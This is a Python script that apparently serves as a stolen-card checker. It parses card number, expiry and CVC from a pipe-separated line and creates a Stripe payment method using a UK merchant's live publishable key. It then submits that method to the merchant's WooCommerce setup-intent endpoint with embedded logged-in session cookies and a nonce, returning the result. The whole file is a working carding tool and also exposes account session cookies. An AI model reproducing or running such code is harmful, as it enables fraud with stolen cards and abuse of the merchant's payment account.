import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2Fc21825cd1c%3B+stripe-js-v3%2Fc21825cd1c%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbespokeutilitydesign.uk&time_on_page=56399&client_attribution_metadata[client_session_id]=849f5906-0437-49c0-a540-d853a858a2cb&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=c4afdd0f-44a5-4070-8d25-05fd7bad31c5&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=c39e0562-6638-4d54-824d-c7a4356d46c7b839db&muid=549544fc-8682-4fe4-8bdd-a1433c1eb02124a8a6&sid=87c98297-b368-4bd9-b33b-8843d6598ee8345c4f&key=pk_live_51QjnPV2MjoKV3YuRePNjSPTGO3FHCRCYwZLtGRtRvQRuKVINj96iZlxGdx6jukb5uYQQGWPq04ClZYwIIChOQis9007yEEZqcf&_stripe_version=2024-06-20'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'wordpress_sec_d54127facf26163901c7742e75741c76': 'waow%7C1772205948%7CXgVkn1ii4J8v79Q0QkuroOTDreHys3tN2aNMwkfG7V2%7C012fde209dc186cc6cf770f2b06ee8af8be54b803d350d40860c1e73f95a5701',
	    '_ga': 'GA1.1.1575939560.1770368766',
	    '_gcl_au': '1.1.262757717.1770368766',
	    '__stripe_mid': '549544fc-8682-4fe4-8bdd-a1433c1eb02124a8a6',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2026-02-25%2014%3A55%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F',
	    'sbjs_first_add': 'fd%3D2026-02-25%2014%3A55%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
	    '__stripe_sid': '87c98297-b368-4bd9-b33b-8843d6598ee8345c4f',
	    'wordpress_logged_in_d54127facf26163901c7742e75741c76': 'waow%7C1772205948%7CXgVkn1ii4J8v79Q0QkuroOTDreHys3tN2aNMwkfG7V2%7Cb0d5b1cb3b5c28ccb4c01057cf16e5727fd4b11cf682d8642f2240dee4180704',
	    '_ga_WVQWTK679F': 'GS2.1.s1772033102$o14$g1$t1772033152$j10$l0$h0',
	    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F',
	}
	
	headers = {
	    'authority': 'bespokeutilitydesign.uk',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'wordpress_sec_d54127facf26163901c7742e75741c76=waow%7C1772205948%7CXgVkn1ii4J8v79Q0QkuroOTDreHys3tN2aNMwkfG7V2%7C012fde209dc186cc6cf770f2b06ee8af8be54b803d350d40860c1e73f95a5701; _ga=GA1.1.1575939560.1770368766; _gcl_au=1.1.262757717.1770368766; __stripe_mid=549544fc-8682-4fe4-8bdd-a1433c1eb02124a8a6; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-02-25%2014%3A55%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2026-02-25%2014%3A55%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=87c98297-b368-4bd9-b33b-8843d6598ee8345c4f; wordpress_logged_in_d54127facf26163901c7742e75741c76=waow%7C1772205948%7CXgVkn1ii4J8v79Q0QkuroOTDreHys3tN2aNMwkfG7V2%7Cb0d5b1cb3b5c28ccb4c01057cf16e5727fd4b11cf682d8642f2240dee4180704; _ga_WVQWTK679F=GS2.1.s1772033102$o14$g1$t1772033152$j10$l0$h0; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F',
	    'origin': 'https://bespokeutilitydesign.uk',
	    'referer': 'https://bespokeutilitydesign.uk/my-account/add-payment-method/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'wc_stripe_create_and_confirm_setup_intent',
	    'wc-stripe-payment-method': f'{pm}',
	    'wc-stripe-payment-type': 'card',
	    '_ajax_nonce': 'd678f9661f',
	}
	
	r2 = requests.post('https://bespokeutilitydesign.uk/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
